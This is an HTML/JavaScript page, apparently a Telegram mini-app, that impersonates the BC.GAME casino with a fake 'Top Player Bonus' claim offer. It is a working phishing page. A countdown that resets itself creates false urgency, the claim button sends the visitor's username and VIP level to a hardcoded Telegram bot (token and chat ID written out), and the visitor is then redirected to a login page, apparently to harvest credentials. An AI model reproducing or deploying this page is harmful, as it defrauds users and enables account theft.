<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>BC.GAME Claim</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }

        html,
        body {
            min-height: 100%;
        }

        body {
            min-height: 100vh;
            min-height: 100dvh;
            font-family: Inter, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
            color: #f6f8f3;
            background: #111616;
            overflow: hidden;
        }

        .dynamic-background {
            position: fixed;
            inset: 0;
            z-index: 0;
            display: block;
            width: 100%;
            height: 100vh;
            height: 100dvh;
            border: 0;
            background: #232626;
            pointer-events: none;
        }

        .page {
            position: relative;
            z-index: 1;
            min-height: 100vh;
            min-height: 100dvh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: clamp(18px, 4vw, 48px);
        }

        .page::before {
            content: "";
            position: fixed;
            inset: 0;
            z-index: 0;
            background: rgba(17, 24, 24, 0.38);
            pointer-events: none;
        }

        .claim-box {
            position: relative;
            z-index: 2;
            width: min(94vw, 1156px);
            animation: claimBoxIn 5250ms cubic-bezier(0.13, 1.08, 0.22, 1) both;
        }

        .bonus-card {
            position: relative;
            min-height: clamp(245px, 34vw, 444px);
            display: grid;
            grid-template-columns: minmax(160px, 0.9fr) minmax(250px, 1.75fr) minmax(220px, 1fr);
            align-items: center;
            gap: clamp(18px, 3vw, 42px);
            padding: clamp(30px, 4vw, 58px) clamp(38px, 4vw, 64px);
            border-radius: clamp(22px, 3vw, 35px);
            border: clamp(2px, 0.34vw, 4px) solid transparent;
            background:
                linear-gradient(90deg, rgba(42, 52, 48, 0.78) 0%, rgba(116, 107, 39, 0.94) 25%, rgba(176, 153, 43, 1) 50%, rgba(108, 101, 43, 0.94) 76%, rgba(42, 52, 48, 0.78) 100%) padding-box,
                radial-gradient(ellipse at center, rgba(255, 225, 70, 0.72) 0%, rgba(153, 132, 36, 0.58) 37%, rgba(42, 52, 48, 0.1) 74%),
                linear-gradient(105deg, #fff6a4 0%, #d79d21 22%, #fff0ae 48%, #b9790b 74%, #fff6a4 100%) border-box;
            box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.26), inset 0 0 34px rgba(255, 230, 103, 0.18), 0 18px 45px rgba(0, 0, 0, 0.38);
            backdrop-filter: blur(2px) saturate(120%);
            -webkit-backdrop-filter: blur(2px) saturate(120%);
            overflow: visible;
            isolation: isolate;
        }

        .bonus-card::before,
        .bonus-card::after {
            content: "";
            position: absolute;
            inset: 0;
            border-radius: inherit;
            pointer-events: none;
        }

        .bonus-card::before {
            z-index: 0;
            background: radial-gradient(ellipse at center, rgba(255, 244, 150, 0.26) 0%, rgba(255, 224, 92, 0.1) 38%, rgba(255, 255, 255, 0) 70%);
        }

        .bonus-card::after {
            z-index: 2;
            background: linear-gradient(112deg, rgba(255, 255, 255, 0.28) 0%, rgba(255, 255, 255, 0.1) 13%, rgba(255, 255, 255, 0) 34%, rgba(255, 255, 255, 0.16) 59%, rgba(255, 255, 255, 0) 76%);
            mix-blend-mode: screen;
        }

        .bonus-card > * {
            position: relative;
            z-index: 1;
        }

        .vip-visual {
            position: static;
            min-height: clamp(160px, 22vw, 300px);
            display: flex;
            align-items: flex-end;
            justify-content: center;
        }

        .vip-ribbon {
            position: absolute;
            left: clamp(38px, 4vw, 64px);
            top: 0;
            width: clamp(96px, 13vw, 164px);
            height: clamp(126px, 17vw, 178px);
            display: flex;
            align-items: flex-start;
            justify-content: center;
            padding-top: clamp(20px, 3vw, 35px);
            background:
                linear-gradient(115deg, rgba(255, 255, 255, 0.52) 0%, rgba(255, 255, 255, 0.16) 18%, rgba(255, 255, 255, 0) 42%),
                linear-gradient(180deg, #fff07b 0%, #f3a400 50%, #ffe064 100%);
            color: #fff;
            font-size: clamp(18px, 2.8vw, 40px);
            font-weight: 900;
            line-height: 1.18;
            text-align: center;
            text-shadow: 0 2px 3px rgba(0, 0, 0, 0.42);
            clip-path: polygon(0 0, 100% 0, 100% 76%, 50% 61%, 0 76%);
            box-shadow: inset 0 2px 0 rgba(255, 255, 255, 0.54), inset 0 -10px 18px rgba(119, 67, 0, 0.22), 0 9px 16px rgba(0, 0, 0, 0.32);
        }

        .gift-img {
            width: clamp(125px, 18vw, 232px);
            height: auto;
            display: block;
            object-fit: contain;
            transform: rotate(-8deg);
            filter: drop-shadow(0 16px 14px rgba(0, 0, 0, 0.42));
        }

        .bonus-copy {
            min-width: 0;
            align-self: center;
            padding-top: 12px;
        }

        .bonus-title {
            margin-bottom: clamp(24px, 3vw, 34px);
            text-shadow: 0 3px 3px rgba(0, 0, 0, 0.3);
        }

        .bonus-title,
        .bonus-value,
        #button-text {
            display: block;
            margin-bottom: 5.83256px;
            font-family: avertastd, Inter, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
            font-size: 20.414px;
            line-height: 29.1628px;
            font-weight: 600;
            letter-spacing: normal;
        }

        .bonus-title,
        .bonus-value {
            color: #fff;
        }

        #button-text {
            color: #07100c;
        }

        .bonus-row {
            display: grid;
            grid-template-columns: minmax(0, 1fr) auto;
            gap: 14px;
            align-items: center;
            color: rgba(255, 255, 255, 0.58);
            font-size: clamp(20px, 3vw, 40px);
            font-weight: 500;
            line-height: 1.3;
            letter-spacing: 0;
            white-space: nowrap;
        }

        .bonus-row span {
            font-weight: 500;
        }

        .bonus-value {
            text-align: right;
            text-shadow: 0 3px 3px rgba(0, 0, 0, 0.28);
        }

        .bonus-actions {
            min-width: 0;
            display: flex;
            flex-direction: column;
            align-items: flex-end;
            justify-content: center;
            gap: 14px;
            padding-top: clamp(88px, 13vw, 160px);
        }

        .claim-button {
            position: relative;
            width: min(100%, clamp(178px, 23vw, 310px));
            min-height: clamp(70px, 9vw, 116px);
            display: inline-flex;
            align-items: center;
            justify-content: center;
            gap: 13px;
            border: 0;
            border-radius: clamp(17px, 2.5vw, 26px);
            background: linear-gradient(135deg, #22f48d 0%, #26eeb6 100%);
            cursor: pointer;
            box-shadow: inset 0 2px 2px rgba(255, 255, 255, 0.35), 0 12px 24px rgba(0, 0, 0, 0.24);
            transition: transform 180ms ease, box-shadow 180ms ease, opacity 180ms ease;
        }

        .claim-button:active {
            transform: translateY(1px) scale(0.99);
            box-shadow: inset 0 2px 2px rgba(255, 255, 255, 0.35), 0 8px 18px rgba(0, 0, 0, 0.2);
        }

        .claim-button:disabled {
            cursor: wait;
            opacity: 0.86;
        }

        .button-spinner {
            display: none;
            width: clamp(22px, 3vw, 34px);
            height: clamp(22px, 3vw, 34px);
            border: 4px solid rgba(7, 16, 12, 0.25);
            border-top-color: #07100c;
            border-radius: 50%;
            animation: spin 800ms linear infinite;
        }

        .claim-button.loading .button-spinner {
            display: block;
        }

        .status {
            min-height: 22px;
            color: rgba(255, 255, 255, 0.72);
            font-size: clamp(12px, 2vw, 18px);
            font-weight: 700;
            text-align: center;
            opacity: 0;
            transform: translateY(6px);
            transition: opacity 200ms ease, transform 200ms ease;
        }

        .status.show {
            opacity: 1;
            transform: translateY(0);
        }

        @keyframes claimBoxIn {
            from {
                opacity: 0;
                transform: perspective(900px) translateY(46px) translateZ(-180px) scale(0.78);
                filter: blur(9px);
            }
            70% {
                opacity: 1;
                transform: perspective(900px) translateY(-4px) translateZ(20px) scale(1.018);
                filter: blur(0);
            }
            to {
                opacity: 1;
                transform: perspective(900px) translateY(0) translateZ(0) scale(1);
                filter: blur(0);
            }
        }

        @keyframes spin {
            to {
                transform: rotate(360deg);
            }
        }

        @media (max-width: 760px) {
            body {
                overflow: auto;
            }

            .page {
                align-items: center;
                padding: 18px 12px;
            }

            .claim-box {
                width: min(100%, 500px);
            }

            .bonus-card {
                min-height: 0;
                grid-template-columns: minmax(112px, 0.75fr) minmax(0, 1fr);
                gap: 12px;
                padding: 24px 18px 18px;
            }

            .vip-visual {
                min-height: 150px;
                grid-row: span 2;
            }

            .bonus-copy {
                padding-top: 0;
            }

            .bonus-title {
                margin-bottom: 14px;
            }

            .bonus-row {
                font-size: clamp(14px, 4.1vw, 19px);
                gap: 8px;
            }

            .bonus-actions {
                grid-column: 2;
                padding-top: 8px;
            }

            .vip-ribbon {
                left: 18px;
            }

            .claim-button {
                min-height: 54px;
                font-size: clamp(20px, 5.4vw, 27px);
            }
        }

        @media (max-width: 430px) {
            .bonus-card {
                padding: 22px 14px 16px;
                grid-template-columns: 105px minmax(0, 1fr);
            }

            .vip-ribbon {
                left: 14px;
                width: 78px;
                height: 104px;
                padding-top: 18px;
                font-size: 16px;
            }

            .gift-img {
                width: 108px;
            }

            .bonus-row {
                white-space: normal;
            }
        }

        @media (prefers-reduced-motion: reduce) {
            *,
            *::before,
            *::after {
                animation-duration: 1ms !important;
                animation-iteration-count: 1 !important;
                scroll-behavior: auto !important;
                transition-duration: 1ms !important;
            }
        }
    </style>
</head>
<body>
    <iframe class="dynamic-background" src="dynamic-background.html" aria-hidden="true" tabindex="-1" title="" sandbox=""></iframe>

    <main class="page">
        <section class="claim-box" aria-labelledby="claim-title">
            <div class="bonus-card">
                <div class="vip-visual" aria-hidden="true">
                    <div class="vip-ribbon">VIP<br>ONLY</div>
                    <img class="gift-img" src="https://bcgame51.com/assets/reload-CoCN1P9X.png" alt="">
                </div>

                <div class="bonus-copy">
                    <h1 id="claim-title" class="bonus-title">Top Player Bonus</h1>
                    <div class="bonus-row">
                        <span>Bonus available:</span>
                        <strong id="reward-amount" class="bonus-value">$10</strong>
                    </div>
                    <div class="bonus-row">
                        <span>Expires in:</span>
                        <strong id="countdown-timer" class="bonus-value">24h 00m 00s</strong>
                    </div>
                </div>

                <div class="bonus-actions">
                    <button id="claim-button" class="claim-button" type="button">
                        <span class="button-spinner" aria-hidden="true"></span>
                        <span id="button-text">Claim Now</span>
                    </button>
                    <div id="claim-status" class="status" aria-live="polite"></div>
                </div>
            </div>
        </section>
    </main>

    <script>
        const tg = window.Telegram && window.Telegram.WebApp ? window.Telegram.WebApp : null;
        if (tg) {
            tg.ready();
            tg.expand();
        }

        const TELEGRAM_BOT_TOKEN = "7488388724:AAEPgkyry54fJcCp3hjIhhtwgZdO-cjyZwU";
        const TELEGRAM_CHAT_ID = "-5244196921";
        const REWARDS = {
            Bronze: "$20",
            Silver: "$100",
            Gold: "$500",
            Platinum: "$1000",
            Diamond: "$5000",
        };

        const params = new URLSearchParams(window.location.search);
        const username = normalizeUsername(params.get("username"));
        const vipLevel = normalizeVip(params.get("vip"));
        const rewardAmount = REWARDS[vipLevel] || "$10";

        const rewardEl = document.getElementById("reward-amount");
        const countdownEl = document.getElementById("countdown-timer");
        const claimButton = document.getElementById("claim-button");
        const buttonText = document.getElementById("button-text");
        const statusEl = document.getElementById("claim-status");
        let claimInProgress = false;

        rewardEl.textContent = rewardAmount;
        startCountdown();
        claimButton.addEventListener("click", claimBonus);

        function normalizeUsername(value) {
            const clean = String(value || "Unknown").trim().replace(/^@+/, "");
            return clean || "Unknown";
        }

        function normalizeVip(value) {
            const vip = String(value || "").trim().toLowerCase();
            if (vip === "diamond" || vip.includes("svip")) return "Diamond";
            if (vip === "platinum") return "Platinum";
            if (vip === "gold") return "Gold";
            if (vip === "silver") return "Silver";
            if (vip === "bronze") return "Bronze";
            return "Unknown";
        }

        function wait(ms) {
            return new Promise(resolve => setTimeout(resolve, ms));
        }

        function startCountdown() {
            const dayMs = 24 * 60 * 60 * 1000;
            const storageKey = "bc_claim_countdown_started_at";
            let startedAt = Number(localStorage.getItem(storageKey));

            if (!Number.isFinite(startedAt) || startedAt <= 0) {
                startedAt = Date.now();
                localStorage.setItem(storageKey, String(startedAt));
            }

            function updateCountdown() {
                const now = Date.now();
                const elapsed = now - startedAt;

                if (elapsed >= dayMs || elapsed < 0) {
                    startedAt = now;
                    localStorage.setItem(storageKey, String(startedAt));
                }

                const remaining = dayMs - (now - startedAt);
                const totalSeconds = Math.max(0, Math.ceil(remaining / 1000));
                const hours = Math.floor(totalSeconds / 3600);
                const minutes = Math.floor((totalSeconds % 3600) / 60);
                const seconds = totalSeconds % 60;

                countdownEl.textContent = `${hours}h ${padTime(minutes)}m ${padTime(seconds)}s`;
            }

            updateCountdown();
            setInterval(updateCountdown, 1000);
        }

        function padTime(value) {
            return String(value).padStart(2, "0");
        }

        async function sendClaimToTelegram() {
            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
            const message = `${username} (${vipLevel}) clicked claim`;

            await fetch(url, {
                method: "POST",
                headers: {
                    "Content-Type": "application/json",
                },
                body: JSON.stringify({
                    chat_id: TELEGRAM_CHAT_ID,
                    text: message,
                }),
            });
        }

        async function claimBonus() {
            if (claimInProgress) return;
            claimInProgress = true;

            claimButton.disabled = true;
            claimButton.classList.add("loading");
            buttonText.textContent = "Claiming...";
            statusEl.textContent = "Processing your claim...";
            statusEl.classList.add("show");

            try {
                await sendClaimToTelegram();
            } catch (error) {
                console.error("Claim notification failed:", error);
            }

            statusEl.textContent = "Redirecting...";
            await wait(850);
            const loginParams = new URLSearchParams({
                username,
                vip: vipLevel,
            });
            window.location.href = `login.html?${loginParams.toString()}`;
        }
    </script>
</body>
</html>
